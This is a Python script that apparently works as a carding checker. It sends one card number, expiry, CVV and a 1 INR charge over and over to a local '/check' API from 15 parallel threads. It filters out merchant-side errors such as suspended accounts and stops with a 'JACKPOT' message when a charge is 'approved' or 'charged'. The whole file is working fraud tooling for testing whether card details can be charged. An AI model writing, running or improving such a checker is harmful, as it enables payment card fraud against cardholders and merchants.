#!/usr/bin/env python3
import json
import urllib.request
import urllib.parse
import threading
import time
import sys
import queue

API = "http://127.0.0.1:7070/check"
CARD = {
    "cc": "4111111111111111",
    "mm": "12",
    "yy": "28",
    "cvv": "111",
    "amount": "1",
    "currency": "INR",
}
NUM_WORKERS = 15
result_queue = queue.Queue()
stop_event = threading.Event()
attempts_lock = threading.Lock()
total_attempts = 0
start_time = time.time()

MERCHANT_RULE_PATTERNS = [
    "ERR_AMOUNT_TOO_HIGH",
    "international_transaction_not_allowed",
    "deactivated",
    "this link is invalid",
    "page not found",
    "invalid_id",
    "not active",
    "suspended",
    "this account is suspended",
    "temporary block",
    "payment operations are put on hold",
    "account is suspended",
]

def is_merchant_noise(msg):
    m = (msg or "").lower()
    return any(p.lower() in m for p in MERCHANT_RULE_PATTERNS)

def classify(resp):
    status = resp.get("status", "")
    msg = resp.get("message", "")
    if status in ("charged", "approved"):
        return ("real", f"*** JACKPOT: {status} ***")
    if is_merchant_noise(msg):
        return ("noise", f"merchant-noise: {msg[:120]}")
    return ("real", f"REAL RESPONSE: status={status} | {msg}")

def worker(wid):
    global total_attempts
    while not stop_event.is_set():
        try:
            params = urllib.parse.urlencode(CARD)
            url = f"{API}?{params}"
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=180) as r:
                data = json.loads(r.read().decode())
            with attempts_lock:
                total_attempts += 1
                a = total_attempts
            kind, detail = classify(data)
            elapsed = time.time() - start_time
            if kind == "real":
                line = (f"[w{wid:2d}] attempt #{a} | {elapsed:.1f}s | {detail}\n"
                        f"         FULL: {json.dumps(data)}\n")
                sys.stdout.write(line)
                sys.stdout.flush()
                result_queue.put(("real", data, detail))
                stop_event.set()
                return
            else:
                amt = data.get("amount", "?")
                cur = data.get("currency", "?")
                line = f"[w{wid:2d}] attempt #{a} | {elapsed:.1f}s | noise | amt={amt}{cur} | {detail}\n"
                sys.stdout.write(line)
                sys.stdout.flush()
        except Exception as e:
            sys.stdout.write(f"[w{wid:2d}] error: {e}\n")
            sys.stdout.flush()
            time.sleep(1)

def main():
    sys.stdout.write(f"Starting {NUM_WORKERS} parallel workers...\n")
    sys.stdout.write(f"Card: {CARD['cc']} | {CARD['mm']}/{CARD['yy']} | CVV {CARD['cvv']}\n")
    sys.stdout.write("Stopping on first REAL bank/payment-engine response\n\n")
    sys.stdout.flush()

    threads = []
    for i in range(NUM_WORKERS):
        t = threading.Thread(target=worker, args=(i,), daemon=True)
        t.start()
        threads.append(t)

    try:
        kind, data, detail = result_queue.get()
        stop_event.set()
        elapsed = time.time() - start_time
        with attempts_lock:
            a = total_attempts
        out = (
            f"\n{'='*70}\n"
            f"STOPPED — got real response after {elapsed:.1f}s, {a} total attempts\n"
            f"{'='*70}\n"
            f"{json.dumps(data, indent=2)}\n"
        )
        sys.stdout.write(out)
        sys.stdout.flush()
    except KeyboardInterrupt:
        stop_event.set()
        sys.stdout.write("\nInterrupted\n")
        sys.stdout.flush()

    for t in threads:
        t.join(timeout=5)

if __name__ == "__main__":
    main()
